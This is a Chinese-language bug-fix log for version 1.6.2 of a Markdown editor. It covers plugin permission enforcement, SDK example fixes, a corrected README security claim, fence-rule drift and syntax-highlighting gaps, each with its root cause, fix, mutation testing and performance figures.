# v1.6.2 Bug 修复记录

总览表里是这一版的缺陷，每一条在下面有一节同编号的记录。文件末尾还有几节**没有编号**的：一次开到一半掉头的改动、一次扫描的收尾、一次没找到问题的审计。它们不是缺陷，不进总览表——但它们记录了「为什么没有那样做」和「查过哪里」，那是下一个人最容易重走的路。

| 编号 | 日期 | 标题 | 优先级 | 状态 |
|------|------|------|--------|------|
| BUG-262 | 2026-09-05 | 17 项权限只强制了 4 项，`document.read` 形同虚设 | P0 | 已修复 |
| BUG-263 | 2026-09-05 | SDK 三个示例返回 `panel` 却不声明 `ui.sidebar` | P1 | 已修复 |
| BUG-264 | 2026-09-05 | 打包测试写死插件版本号，每次发版要手改一遍 | P2 | 已修复 |
| BUG-265 | 2026-09-05 | 权限被强制执行，读者却没有任何地方能看到它是什么 | P1 | 已修复 |
| BUG-266 | 2026-09-05 | README 用 12 种语言承诺「安装前给你看权限」，从未成立 | P1 | 已修复 |
| BUG-267 | 2026-09-05 | 围栏闭合规则有五份实现，其中两份漂移，大纲每条都会错位 | P1 | 已修复 |
| BUG-268 | 2026-09-05 | 插件的第五份同样漂移；改写时又踩中 lua_dardo 的模式库差异 | P1 | 已修复 |
| BUG-269 | 2026-09-05 | 缩进四列的 `>` 被染成引用色，预览并不画引用 | P2 | 已修复 |
| BUG-270 | 2026-09-05 | 用 `_` 写的强调，预览画了，源码窗格一片灰 | P1 | 已修复 |
| BUG-271 | 2026-09-05 | `==高亮==` 与 `++下划线++` 同样只有预览认，showcase 一行里就能看到 | P2 | 已修复 |
| BUG-272 | 2026-09-05 | 段落里有公式或图片，复制到 Word 就丢掉全部格式 | P1 | 已修复 |
| BUG-273 | 2026-09-05 | 行内代码的两个「留白」空格是内容，搜索一开就消失 | P1 | 已修复 |
| BUG-274 | 2026-09-05 | 从源码窗格复制时无视 HTML 开关，同一段源码两个窗格结果不同 | P2 | 已修复 |
| BUG-275 | 2026-09-05 | `==高亮==` 导出到 Word 完全没有底色，上游库漏判 | P1 | 已修复 |
| BUG-276 | 2026-09-05 | 从网页粘贴时 `<mark>` `<u>` `<sup>` `<sub>` 的语义全部丢失 | P1 | 已修复 |
| BUG-277 | 2026-09-05 | 配置里一个字段类型写错，全部设置静默恢复默认 | P1 | 已修复 |
| BUG-278 | 2026-09-05 | 装了却读不进来的插件静默消失，写好的原因从没送达 | P1 | 已修复 |
| BUG-279 | 2026-09-05 | 磁盘冲突时选「覆盖」，写失败却看起来成功了 | P0 | 已修复 |
| BUG-280 | 2026-09-05 | 同一个对话框的「重新加载」，BUG-279 只修了一半 | P1 | 已修复 |
| BUG-281 | 2026-09-05 | 行内公式与脚注引用在源码窗格不染色，BUG-271 漏掉的两个 | P2 | 已修复 |
| BUG-282 | 2026-09-06 | `maxRecentFiles` 常量说 20，实际是别处硬编码的 10，而且从没被读过 | P2 | 已修复 |
| BUG-283 | 2026-09-06 | `AppConstants` 18 个常量里 14 个没人读，其中一个已经和实际分家 | P2 | 已修复 |
| BUG-284 | 2026-09-06 | 关闭看门狗从来没被撤下，正常退出会被 600ms 的 `exit(0)` 抢先 | P1 | 已修复 |
| BUG-285 | 2026-09-06 | SDK 示例逐行标注权限，五个里标了四个——漏的正是 BUG-263 那个 | P2 | 已修复 |
| BUG-286 | 2026-09-06 | SDK 的动作表没说哪些动作需要权限，而那是作者被拒时唯一要查的 | P2 | 已修复 |
| BUG-287 | 2026-09-06 | 脚注引用的正则在一行 `[^` 上退化成二次方，2.3 秒 | P1 | 已修复 |
| BUG-288 | 2026-09-06 | 一行 `<!--` 让源码窗格卡十二秒；顺带给那组测试装了对账 | P1 | 已修复 |
| BUG-289 | 2026-09-06 | 同一条注释正则的第三份拷贝，在粘贴路径上 | P2 | 已修复 |
| BUG-290 | 2026-09-06 | 上一条下面两行的兄弟，同一个形状 | P2 | 已修复 |
| BUG-291 | 2026-09-06 | 甘特图一行冒号要五秒半；顺带把「每种图型」补成 22 种 | P2 | 已修复 |
| BUG-292 | 2026-09-06 | SDK 已发布的 README 指向不存在的目录与工具（十二份文档） | P1 | 已修复 |
| BUG-293 | 2026-09-06 | 官方插件带的 API 模块落后 SDK 五个选项 | P2 | 已修复 |
| BUG-294 | 2026-09-06 | 一个死循环的脚本插件会永久冻住编辑器 | P1 | 已定位，修法待定 |
| BUG-295 | 2026-09-06 | SDK 文档向插件作者承诺了一个不存在的保护 | P2 | 已修复 |
| BUG-296 | 2026-09-06 | 插件 ZIP 没有任何大小限制，一个 zip bomb 能撑爆内存或磁盘 | P2 | 已修复 |
| BUG-297 | 2026-09-07 | 「发现社区插件」把限流和断网都显示成「没有插件」 | P1 | 已修复 |
| BUG-298 | 2026-09-07 | 插件设置页把多行提示词的第二行起全藏了 | P1 | 已修复 |
| BUG-299 | 2026-09-07 | 插件声明了图标，侧边栏仍画通用插件方块 | P2 | 已修复 |
| BUG-300 | 2026-09-07 | AI 写作的六个建议在每种语言里都是英文 | P2 | 已修复 |
| BUG-301 | 2026-09-07 | 悬浮卡片只能在文档那一格里拖动 | P2 | 已修复 |
| BUG-302 | 2026-09-07 | 右侧边栏抽屉里的插件问不了问题，也就没法用 | P1 | 已修复 |
| BUG-303 | 2026-09-07 | 插件不申请 `network.request` 也能让宿主替它发出站请求 | P0 | 已修复 |
| BUG-304 | 2026-09-07 | `PluginPermission.withImplied` 写好了没人调，`ui.webview` 不带网络 | P1 | 已修复 |
| BUG-305 | 2026-09-07 | 权限清单里长句子横向溢出，最该读的那条读不到 | P1 | 已修复 |
| BUG-306 | 2026-09-07 | 文档里的远程图片和更新检查不走系统代理，全局没有 `HttpOverrides` | P1 | 已修复 |
| BUG-307 | 2026-09-07 | `markdown` 节点里的 `![](http://…)` 绕过权限、日志和代理 | P1 | 已修复 |
| BUG-308 | 2026-09-07 | 提示词模板丢了 `{{instruction}}` / `{{language}}`，读者刚输入的东西静默消失 | P1 | 已修复 |
| BUG-309 | 2026-09-07 | 标题被留在上一批，它要介绍的正文另起一条请求 | P2 | 已修复 |
| BUG-310 | 2026-09-07 | lua_dardo 里嵌套函数中的裸 `return` 是空操作，守卫全部失效 | P0 | 已修复 |
| BUG-311 | 2026-09-07 | 大文档只按行数分段，行少字节多的文档首帧等 4 秒 | P1 | 已修复 |
| BUG-312 | 2026-09-07 | 状态栏字数在 UI 线程上整篇统计，大文档每次停下打字卡 176ms | P2 | 已修复 |
| BUG-313 | 2026-09-07 | 大纲和字数是同一形状，注释点了名，上一轮只修了字数 | P2 | 已修复 |
| BUG-314 | 2026-09-08 | 「重新加载图片」（F5）什么也不做，块缓存签名里没有它 | P1 | 已修复 |
| BUG-315 | 2026-09-08 | 插件图片缓存以「代号:地址」为键，每次重载滞留一整代字节 | P2 | 已修复 |
| BUG-316 | 2026-09-08 | 改代码字体/字号，预览不跟着变；块缓存签名还漏着三个 | P1 | 已修复 |
| BUG-317 | 2026-09-08 | 四种图表改了数据不重绘：`==` 不比它们的数据列表 | P1 | 已修复 |
| BUG-318 | 2026-09-08 | `XYChartSeries` 相等而哈希不同，违反 hash 契约 | P2 | 已修复 |
| BUG-319 | 2026-09-08 | 列表里留一个空条目，后面的全被吞进去缩进一层 | P1 | 已修复 |
| BUG-320 | 2026-09-08 | 插件下载地址不检查 https，只有 registry 那一半强制了 | P1 | 已修复 |
| BUG-321 | 2026-09-08 | 跑不了的编译插件照样装上，直到点它才说没有本平台的构建 | P2 | 已修复 |
| BUG-322 | 2026-09-08 | `entrypointPath` 零调用零测试，且回退规则与实际启动相左 | P2 | 已删除 |
| BUG-323 | 2026-09-08 | 读不出来的插件没有删除按钮，读者唯一想删的那个删不掉 | P0 | 已修复 |
| BUG-324 | 2026-09-08 | 社区搜索失败时把 `HttpException:` 类名甩给读者 | P1 | 已修复 |
| BUG-325 | 2026-09-08 | 不是打字改的内容，预览永远不更新——插件写回、磁盘重载、MCP 全中 | P0 | 已修复 |
| BUG-326 | 2026-09-08 | 源码窗格不认反斜杠转义，`\$5` 被画成公式 | P1 | 已修复 |
| BUG-327 | 2026-09-08 | 激活不存在的标签会写进状态并回报成功 | P1 | 已修复 |
| BUG-328 | 2026-09-08 | MCP 宣称支持 `open_file` 与 `run_plugin_command`，两个都没实现 | P1 | 已撤下 |
| BUG-329 | 2026-09-08 | 撤下动作后描述与参数没跟上；两份名单靠人手同步 | P1 | 已修复 |
| BUG-330 | 2026-09-08 | 十一个快捷键能在设置里重绑、菜单里画着，按下去毫无反应 | **P0** | 已修复 |
| BUG-331 | 2026-09-08 | SDK schema 的四个约束只有三个被对账，第四个没人看 | P2 | 已加守卫 |
| BUG-332 | 2026-09-08 | 同一个动作在命令面板与设置里显示成两个名字（中文、俄语各一处） | P2 | 已修复 |
| BUG-333 | 2026-09-08 | 导出守卫自称能覆盖将来新增的导出，而它的清单是手写的 | P2 | 已修复 |
| BUG-334 | 2026-09-08 | 首帧前那步「不该写盘」只写在注释里，没有守卫 | P2 | 已加守卫 |
| BUG-335 | 2026-09-08 | 快捷键索引的三个失效点全都没人守——删掉任意一个，2730 条测试全绿 | **P1** | 已加守卫 |
| BUG-336 | 2026-09-08 | 预览的 AST 缓存失效同样无人守；注释里记着它当年怎么坏的 | P1 | 已加守卫 |
| BUG-337 | 2026-09-08 | 在分屏的预览里勾选复选框，会在 widget 生命周期里改 provider | **P1** | 已修复 |
| BUG-338 | 2026-09-08 | Windows 保存重试无人守；删掉它，杀毒软件一占用就报保存失败 | P1 | 已加守卫 |
| BUG-339 | 2026-09-08 | 「检查更新」在没连上网时也能说出「已是最新版本」 | P1 | 已加守卫 |
| BUG-340 | 2026-09-08 | 翻译插件的分段规则三处无守卫：围栏吞掉全文、tab 空行、CRLF 文档 | P1 | 已加守卫 |
| BUG-341 | 2026-09-08 | 翻译形状守卫建在主仓库，而出事的是 SDK——它的 11 份没人看 | P2 | 已加守卫 |
| BUG-342 | 2026-09-08 | 从右侧边栏点开的插件，问题弹在浮动卡片里、答案落在抽屉里 | **P1** | 已修复 |
| BUG-343 | 2026-09-08 | MCP 的每一次拒绝，在协议层都写着「成功」 | P1 | 已修复 |
| BUG-344 | 2026-09-08 | 每次启动都去搜一遍社区插件，两三次就把 GitHub 配额用光 | **P1** | 已修复 |
| BUG-345 | 2026-09-08 | 插件读不出来这件事从不进日志，`read_logs` 里查不到任何线索 | P1 | 已修复 |
| BUG-346 | 2026-09-08 | 一条断言查子串 `rate`，而「generated」也含它 | P3 | 已修复 |
| BUG-347 | 2026-09-08 | README 说性能有测试盯着，而那样的测试不存在 | P1 | 已修复 |
| BUG-348 | 2026-09-08 | 上一条改 README 时把高亮也写进了线性承诺，而它是超线性的 | P2 | 已修复 |
| BUG-349 | 2026-09-08 | 「直接依赖数」在 12 份 README 里写着两个数，两个都不对 | P2 | 已修复 |
| BUG-350 | 2026-09-08 | SDK 文档写给插件作者的两个上限，与编辑器的常量无人对账 | P2 | 已加守卫 |
| BUG-351 | 2026-09-08 | 我建的性能测试第一次上 CI 就自己红了 | P1 | 已修复 |
| BUG-352 | 2026-09-08 | MCP 报出插件的四个命令，一个都不接受；拒绝还报成功 | **P1** | 已修复 |
| BUG-353 | 2026-09-08 | 四种语言的 SDK 文档里，右侧边栏面板这个能力完全不存在 | **P1** | 已修复 |
| BUG-354 | 2026-09-08 | 主仓库的翻译守卫有同一个盲区（今天没出事，明天没人管） | P2 | 已加守卫 |
| BUG-355 | 2026-09-08 | 插件脚本要的翻译键，没人保证 manifest 里有 | P2 | 已加守卫 |
| BUG-356 | 2026-09-08 | 插件设置页的字段，没人保证脚本会读它 | P2 | 已加守卫 |
| BUG-357 | 2026-09-08 | 两个插件仓库的 CHANGELOG 各长出了重复小节；SDK 的还落后四次改动 | P2 | 已修复 |
| BUG-358 | 2026-09-08 | 编辑器用两种方式数「字符」，两处都不说自己数的是哪种 | P3 | 已修复 |
| BUG-359 | 2026-09-08 | 实机验证过的六种畸形文档，本机一条测试都没有 | P3 | 已加守卫 |
| BUG-360 | 2026-09-08 | 我写的内存守卫比较了同一个变化中的量的两次读数 | P2 | 已修复 |
| BUG-361 | 2026-09-09 | 大文档的耗时日志报的是前缀的块数和耗时，却写成整篇的 | P2 | 已修复 |
| BUG-362 | 2026-09-09 | 大文档只画完前缀，预览就收起加载指示器、画出文末落点 | P3 | 已修复 |
| BUG-363 | 2026-09-09 | 两种图表可以画成全空，22 种类型的守卫一条都看不见 | P2 | 已加守卫 |
| BUG-364 | 2026-09-09 | 25 个窗口动作没有一个被执行过，接空或接反都无人发现 | P2 | 已加守卫 |
| BUG-365 | 2026-09-09 | 52 个格式动作里 25 个从未被测试执行，接错了也没人发现 | P2 | 已加守卫 |
| BUG-366 | 2026-09-09 | 自动化接口为不存在的标签回报「已关闭」「已写入」 | P2 | 已修复 |
| BUG-367 | 2026-09-09 | get_state 报的内容从没被任何测试核对过 | P3 | 已加守卫 |
| BUG-368 | 2026-09-09 | 「关于」对话框显示 v1.0.1，而应用是 1.6.1 | P2 | 已修复 |
| BUG-369 | 2026-09-09 | 右侧栏里 AI 写出的结果没有「采用」按钮，无法放进文档 | P1 | 已修复 |
| BUG-370 | 2026-09-09 | 右侧栏把 Markdown 原样显示，且等模型时毫无动静 | P1 | 已修复 |
| BUG-371 | 2026-09-09 | 切回分屏标签时源码回到原处、预览停在顶部，两半错开 | P1 | 已修复 |
| BUG-372 | 2026-09-09 | 不提问的面板也摆出追加输入框，收下的要求无处可去 | P2 | 已修复 |
| BUG-373 | 2026-09-09 | SDK 没有说明追加一轮时脚本会收到什么 | P3 | 已加守卫 |
| BUG-374 | 2026-09-09 | 两个脚本运行时的键名对账，靠手写的四个名字 | P3 | 已加守卫 |

---

## BUG-262：17 项权限只强制了 4 项

### 现象

看不见——这正是问题所在。一个 manifest 里 `permissions` 写成空数组的插件，装上之后照样能在文档旁边开窗格、在侧边栏开面板、弹通知，**并且读到文档全文和选中内容**。

### 根因分析

README 承诺权限「不是只展示，而是强制执行」，理由写得很明白：这里没有任何人审核，所以由编辑器来查。FEAT-103 的验收标准也只举了 `ai.chat` 和 `document.write` 两例——**验收标准本身就是实现的镜子**，写它的时候只想到了这两条。

`PluginCommandService._guard` 的 switch 只有两个分支：

```dart
PluginAiAction() => PluginPermission.aiChat,
PluginReplaceAction() => PluginPermission.documentWrite,
```

其余动作走 `_ => null`，一律放行。

更要紧的是 `document.read`。它是读者最会掂量的那一项，而它**在任何地方都没有被读过**：`PluginScriptContext` 带着文档全文和选区，原样交给每一个插件的 `runCommand`。声明与否不改变任何行为。

### 修复方案

两处。

`_guard` 覆盖每一种**会到达读者**的动作，而不只是当初觉得重要的那两种：窗格占掉文档一半的地方，通知打断阅读，面板占据侧边栏——这些都不是插件不吭声就该拿到的。检查留在 `_guard` 这一个地方，新增的调用方不会漏掉。

`document.read` 用**扣留**而不是拒绝：没声明的插件拿到的是空文档和空选区。空文档本来就是插件必须能处理的状态（新建标签页就是），所以扣留不会把它推进一条没走过的路径；而拒绝会。

### 验证

先写 `plugin_permission_guard_test`（7 条）证明缺口存在，再修。

修完有 5 条既有测试转红，全部是测试插件没声明自己用的权限——**这正是守卫起作用的证据**，不是回归。给那些测试插件补上它们实际用到的声明。

两次突变：`_guard` 改回只查两种动作，杀 4 条；`_seen` 改成原样返回 context，杀 1 条。

### 涉及文件

`lib/services/plugin_command_service.dart`；`test/services/plugin_permission_guard_test.dart`（新增）；`plugin_modules_test`、`plugin_command_service_test`、`plugin_compatibility_test`、`plugin_apply_action_test`

---

## BUG-263：SDK 示例教了错的写法

### 现象

照 SDK 示例写的插件，面板打不开。

### 根因分析

BUG-262 修完之后浮出来的。`packages/{lua,js,dart}/manifest.json` 三份示例都返回 `panel`，`permissions` 里却没有 `ui.sidebar`。

在守卫收紧之前这不出错，所以没人发现。示例是给人照抄的——它们在教一种从今往后会被拒绝的写法。

### 修复方案

三份示例 manifest 都补上 `ui.sidebar`。

### 涉及文件

SDK 仓库 `packages/lua/manifest.json`、`packages/js/manifest.json`、`packages/dart/manifest.json`

---

## BUG-264：打包测试写死插件版本号

### 现象

`expect(manifest.version, '0.1.4')`。插件发新版，主应用测试红。

### 根因分析

一个版本号写在两个地方就会漂。这里的两处是插件仓库的 manifest 和主应用的测试。

### 修复方案

测试改成读插件仓库自己的 manifest（`_findPluginRepo()` 向上查找），比较两者一致，而不是比较一个手抄的常量。

### 验证

把插件仓库的 manifest 版本改成 `0.9.9`，测试失败——证明它读的确实是仓库而不是别处。

### 涉及文件

`test/services/packaged_plugin_test.dart`

---

## BUG-265：强制执行的权限，读者看不到

### 现象

BUG-262 让权限真的会拦人之后，一个插件的功能「没反应」时，读者**在应用里找不到任何地方**能看到这个插件声明了什么。

插件详情页有名称、版本、发布日期、是否预发布、「Community / Unverified」、简介、README、更新说明、仓库链接——唯独没有权限。已安装列表也没有。

### 根因分析

`PluginPermission.describe()` 早就写好了，17 条权限每条一句人话：

```dart
documentRead => 'Read the open document and your selection',
aiChat => 'Ask the AI model you configured (never sees your API key)',
networkRequest => 'Send requests to any server it chooses',
```

它**唯一的调用方是一个测试**。生产代码里没有任何地方展示过它。

那句 fallback——「Unrecognised permission — this version grants nothing for it」——更说明问题：它是专门写给读者看的，而它假设的那个界面从来没有存在过。

这让读者处在最糟的位置：编辑器正在替他们拒绝东西，依据的是一份他们看不见的清单。

### 修复方案

两处，都用同一个 `describe()`。

**详情页**：头部之下、README 之上，一段 Permissions。不放进 tab——一个插件被允许做什么，是决定要不要留着它的信息，不是补充材料。

只对**已安装**的插件显示。搜索结果是 GitHub 上的一个 release，manifest 在还没下载的包里；那里显示空列表会被读成「它什么都不要」，而这是编辑器没有资格给的承诺。宁可不说。

不认识的权限**照样显示**，用那句 fallback。静默丢掉这一行，会让作者和读者一起盯着一个什么都不做的插件，不知道原因是 manifest 里把 `document.read` 打成了 `documents.read`。

**拒绝通知**：原来只说标识符——`AI Assistant did not ask for the "ui.sidebar" permission`。`ui.sidebar` 是作者往 manifest 里敲的字符串，对读者没有意义。现在两样都给：句子给读者判断介不介意，标识符给要去补 manifest 的人。

### 验证

6 条新测试（`plugin_permissions_test`）+ 2 条（`plugin_permission_guard_test`）。

四次突变，每次只杀掉对应的那条：
- 不显示 → 杀 3 条
- 对未安装的也显示 → 只杀「搜索结果不显示权限段」1 条
- 过滤掉不认识的权限 → 只杀「未识别权限仍要显示」1 条
- 拒绝消息去掉人话 → 只杀「说人话」1 条

### 涉及文件

`lib/models/plugin_catalog_entry.dart`、`lib/ui/screens/plugin_detail_view.dart`、`lib/services/plugin_command_service.dart`；`test/ui/screens/plugin_permissions_test.dart`（新增）、`test/services/plugin_permission_guard_test.dart`

---

## BUG-266：README 承诺了一件从未做过的事

### 现象

README 第 100 行：

> **🔐 Permissions** | Declared in the manifest, **shown before you install**, and **enforced**.

装之前从来看不到。BUG-265 修完之后也仍然看不到——那一段只对已安装的插件显示。

### 根因分析

CLAUDE.md 列的第二条排查视角：「编辑器说了与事实不符的话」。这次说话的是 README，而且是关于**安全**的一句话——读者据此判断装一个 Community/Unverified 的插件有多大风险。

11 份翻译逐字照搬了这个承诺，所以它是 12 份文档里的 12 句不实。CHANGELOG 的 v1.6.1 条目里也有同一句。

顺带发现另一处漂移：12 份 README 都写着「2417 tests」，实际 2432。一个数字写在 12 个地方，每次加测试都会漂。

### 修复方案

改成实话：「shown on the plugin's page」——插件页面上确实列出来了（BUG-265）。12 份全改，包括阿拉伯语的 RTL 那行。

CHANGELOG 的 v1.6.1 条目删掉「and you see the list before installing」这半句。已发布条目本不该重写，但一句从未成立的安全承诺留着比改掉更糟；「enforced」改成「meant to be enforced」，因为发布时它只做到 4/17，真正做到是在 v1.6.2。

**装前展示没有做。** 那要在下载并校验 ZIP 之后、启用之前插一道确认门——浏览器扩展的做法，也是唯一诚实的「装前」。那是产品决策不是缺陷修复，留给用户定夺（见 FEAT-125 末尾）。

### 涉及文件

`README.md`、`docs/i18n/README_*.md`（11 份）、`CHANGELOG.md`

---

## BUG-267：围栏闭合规则的五份实现，两份漂移

### 现象

一篇讲 Markdown 的文档——本项目自己的 README 就是——会在 ```` 块里展示 ```。大纲面板于是把块里的 `# 标题` 列了出来，而预览不画它。**从第一处分歧起，大纲里每一条都跳到错的位置**。

### 根因分析

CLAUDE.md 列的第一条排查视角：一条规则被抄了好几份，其中一份没跟上。这次是**五份**：

| 位置 | 实现 | 是否正确 |
|------|------|---------|
| `_closesFence`（`parse`） | 同字符 + 不短于 + 无 info string | ✅ |
| 链接定义扫描 | 内联重写，等价 | ✅ |
| `headingOutline` | **`inFence = !inFence`（toggle）** | ❌ |
| `safePrefix` | **只比字符，不比长度** | ❌ |
| 高亮器 `fenceStates` | 手写，三项全查 | ✅ |

`headingOutline` 的注释自己写着「必须和 `parse()` 看到同一份文档」，而它用的是 toggle。

`safePrefix` 那份更隐蔽：它的契约是「切点绝不落在围栏中间」，而 ```` 块里的 ``` 会让它以为块已结束，于是切在代码中间。它还在循环里**每行现场构造一个 RegExp**。

### 修复方案

两处都改用 `_closesFence`——规则收敛到解析器，其他地方来问它。

高亮器那份留着手写：它每次击键跑遍全文，注释记着 RegExp 在 1.4 MiB 上要 33ms、手写不到 2ms。它是正确的，但**没有任何东西把它和其他四份绑在一起**。新增 `fence_rule_agreement_test`（9 条）做这件事：同一批刁钻文档，源码窗格的围栏判断与大纲必须给出同一份标题清单。

### 验证

- `headingOutline` 回到 toggle → 杀 3 条
- `safePrefix` 只比字符 → 杀 1 条（正是 ```` 内嵌 ``` 那条）
- 高亮器去掉长度检查 → 杀 2；去掉字符检查 → 杀 2；去掉 bare 检查 → 杀 1

**三条既有的切点测试原本什么也没测。** 它们用 1490 组「段落 + 空行」做填充，把围栏推到第 2980 行——而切点门槛是 1500 行，围栏根本进不了前缀，数它的标记数的是零个，怎么改都通过。改成让围栏**跨越**切点之后，「任何一行都闭合围栏」的变异才杀掉全部三条。

### 性能

847 KB、12000 个标题、600 个嵌套围栏块：

| | 旧 | 新 |
|---|---|---|
| `headingOutline` | 88 / 96 / 57 ms | 70 / 85 / 52 ms |
| `safePrefix` | 10 / 8 / 7 ms | 9 / 8 / 6 ms |
| 标题数 | **12600**（多出 600 个假标题） | 12000 |

没有回退，略快——`safePrefix` 不再每行 new 一个 RegExp。

### 涉及文件

`lib/services/markdown_parser.dart`；`test/services/heading_outline_test.dart`、`test/services/safe_prefix_test.dart`、`test/services/fence_rule_agreement_test.dart`（新增）

---

## BUG-268：插件里的第五份，以及 lua_dardo 的模式库

### 现象

全文翻译把含嵌套围栏的代码块切成两半，分别发给模型——正是 `blocks.split` 存在的理由（「cutting there would hand the model half a program」）。

### 根因分析

`blocks.lua` 的 `is_fence` 只看前三个字符是不是 ``` 或 ~~~，然后 `fenced = not fenced`。和 BUG-267 里的大纲是同一个错误，第六份。

### 修复方案

同样的规则：记下开启的 run（字符 + 长度 + 是否裸），闭合要求三项都对。

**改写时踩中一个更糟的坑。** 判断「围栏后面没有内容」我写的是：

```lua
bare = line:sub(i + length):match("^%s*$") ~= nil
```

在标准 Lua 里，空字符串匹配 `^%s*$` 返回 `""`，`~= nil` 为真。**在 lua_dardo（纯 Dart 实现的 Lua）里它返回 nil**，于是 `bare` 恒为 false，**任何围栏都永远不闭合**——比原来的缺陷严重得多：代码块之后的整篇文档都不再切分。

改用文件里已有的 `is_blank`，它逐字符检查，不依赖模式库。

### 验证：三次无效的破坏

这条的教训不在修复，在验证。前后写了三版测试，**头两版的变异全部无效**：

1. 第一版断言 `first.nextPrompt` 含完整代码。批次层会把切开的两半合并回 1500 字符一批，所以切没切开都通过。
2. 第二版把每一半撑到超预算——但 fixture 的代码体是**连续的行，中间没有空行**，切分无处可切，规则怎么错都是一块。三次变异，三次全过。
3. 第三版不再隔着三层看：新增 `plugin_blocks_split_test`，用真实的 `blocks.lua` 配一个只报告块边界的三行脚本，直接问 `split` 切在哪。

第三版四次变异全部被杀，每次恰好一条。而且正是它抓出了 `match` 那个坑——前两版都是通过的。

隔着三层（split → batch → 提示词模板）去观察一条规则，每一层都在吞掉信号。`ai_translate_plugin_test` 里那三条已被证明无效，一并删掉：一个声称覆盖了某件事却什么也没测的测试，比没有更糟。

### 涉及文件

插件 `lib/blocks.lua`、`CHANGELOG.md`；`test/services/plugin_blocks_split_test.dart`（新增）、`test/services/ai_translate_plugin_test.dart`

---

## BUG-269：染成引用色的行，预览不画引用

### 现象

一行缩进四列以上、以 `>` 开头的文字，在源码窗格里是引用色，预览里是普通段落。

### 根因分析

BUG-267 的同一类，第二处。高亮器的行级判断里，标题早已收敛到 `MarkdownParser.headingLevelOf`（注释写明了理由：`startsWith('#')` 会把 `#标签` 染成标题），**引用却仍是手写的**：

```dart
final withoutIndent = line.trimLeft();
if (withoutIndent.startsWith('>')) {
```

`trimLeft()` 剥掉任意多的缩进；解析器的 `_blockquoteRe` 只允许 `[ \t]{0,3}`——四列起是缩进块。两边就此分歧。

### 修复方案

解析器新增 `blockquoteDepthOf(String line)`，与 `headingLevelOf` 同一形状、同一理由；高亮器改用它。

### 验证

新增 `highlight_agrees_with_parser_test`：一组行，源码窗格染不染引用色，必须和预览画不画引用节点一致。

三次变异：高亮器退回 `trimLeft` 杀 2 条；解析器放宽缩进杀 1 条；层数恒为 1 杀 1 条。

**第二次变异一开始杀不掉任何东西**——一致性测试的固有盲区：两边读同一份规则，放宽规则是两边一起放宽，比较自然还是相等。补了一组直接断言规则本身的测试（三列可以、四列不行、`> >` 是两层）才抓得住。

### 性能

24858 行、约 1.4 MB：184/186 ms → 稳定态无差别（RegExp 比 `trimLeft` 略贵，落在噪声里）。没有加快速路径——3% 的收益不值得引入一条要单独验证的分支，何况这个解析器上的快速路径已经证伪过两次。

### 涉及文件

`lib/services/markdown_parser.dart`、`lib/ui/editor/syntax_highlighter.dart`；`test/ui/editor/highlight_agrees_with_parser_test.dart`（新增）

---

## BUG-270：用 `_` 写的强调，源码窗格一片灰

### 现象

`_倾斜_` 和 `__加粗__` 在预览里是斜体和粗体，在源码窗格里没有任何颜色。

CommonMark 给 `_` 和 `*` 同等地位，解析器一直读两种；**只有高亮器的内联规则表里只有星号**。本项目自己的文档用 `*`，所以一直没人撞上——但外面用 `_` 的文档是多数。

### 修复方案

加两条规则。`__` 必须排在 `_` 前面：循环在同一起点取先遍历到的那条。

关键在于**为什么这是安全的**：`_Pattern.accepts` 早就在问解析器的 `emphasisFlanking`，并且把标记字符传了进去——而 `_` 的 flanking 规则比 `*` 严格，正是它拒绝 `read_me_now` 里的下划线。规则本来就在共享，缺的只是两条 pattern。

### 性能：加进去慢了 50%，最后比原来更快

44858 行、约 2.5 MB：

| | 稳定态 |
|---|---|
| 原来（只认 `*`） | 314 / 324 ms |
| 加 `_` 与 `__` | **473 / 476 ms** |
| 加预扫之后 | **298 / 302 ms** |

50% 的回退不能留。原因是每一行都要为 `_` 跑一遍正则，而下划线密集的行（`snake_case`）还会反复匹配、反复被 flanking 拒绝。

修法是**一次扫描换九次正则**：先过一遍这一行，记下 `* _ \` [ ! < ~` 里哪些字符出现过；没出现的标记，对应的规则一次都不必跑。多数行一个都不含。

这不是为 `_` 打的补丁——它对原有的七条规则同样生效，所以净结果比改动前还快。

`marker` 参数**必填**而不是给默认值：一条忘了写 marker 的规则会在每一行都被跳过，而默认值和忘记传参在代码里长得一模一样。

### 验证

- 去掉 `__` 规则 → 杀 1；去掉 `_` 规则 → 杀 1
- `_` 不受 flanking 约束 → 杀 2（`read_me_now` 与 `_倾斜。_后面`），证明共享规则是必需的
- 预扫的七个字符**逐个**去掉 → 各杀 1（`_` 杀 3）

其中一条变异一开始没被抓住：预扫漏掉 `!` 时 `![alt](/img)` 仍然通过，因为链接规则会匹配它的 `[alt](/img)` 部分，而断言只问「有没有链接色的 span」。改成断言**第一个** span 是链接色才区分得开。

### 涉及文件

`lib/ui/editor/syntax_highlighter.dart`；`test/ui/editor/highlight_agrees_with_parser_test.dart`

---

## BUG-271：showcase 自己那一行，四种强调只染了一种

### 现象

`test/fixtures/showcase.md` 第 16 行：

```
~~strikethrough~~, ==highlight==, ^superscript^, ~subscript~, and a
```

源码窗格里，删除线有线，后面三个是普通文字。编辑器自带的展示文档，一行里四种强调只染了一种。

### 根因分析

BUG-270 的同一类，第三处。解析器读 `==`、`++`、`^`、`~`，渲染器六种都画；高亮器的规则表里没有它们。

### 修复方案

加 `==` 和 `++` 两条：前者用和预览一样的底色，后者用下划线。

**上下标不做，这是决定不是遗漏。** 预览把它们抬高/压低并缩小字号，用的是 `WidgetSpan`。源码窗格是 `TextField`：改一段文字的字号会带着行高和光标一起动。染成一种它不是的样子，比不染更糟。测试里有一条钉住这个决定，连理由一起。

顺带把那个底色收敛：`Colors.yellow.withValues(alpha: 0.4)` 原本在渲染器里硬编码，现在是 `HighlightColors.marked`，两个窗格读同一个值。

### 一个没有动的问题

**搜索命中的底色和 `==标记==` 的底色是同一个黄。** 在一篇有 `==标记==` 的文档里搜索，读者分不出哪个是文档里写的、哪个是刚找到的。

没有动，因为修它要挑一个新颜色——那是审美决策。而且真要做，更该做的是让这个底色跟着主题走：现在它硬编码成黄色，深色主题下配深色文字并不好读。两件事都留给用户定夺。

### 验证

四次变异，各杀 1 条：去掉 `==` 规则、去掉 `++` 规则、预扫漏掉 `=`、预扫漏掉 `+`。

### 性能

64858 行、约 3.5 MB，且刻意做成 `=`/`+` 密集（每三行一行代码）：303 ms → 312 ms，约 3%，落在噪声里。预扫（BUG-270）让新规则在不含标记的行上完全不跑。

### 涉及文件

`lib/ui/editor/syntax_highlighter.dart`、`lib/ui/editor/markdown_renderer.dart`；`test/ui/editor/highlight_agrees_with_parser_test.dart`

---

## BUG-272：段落里有一个公式，复制出去就只剩纯文本

### 现象

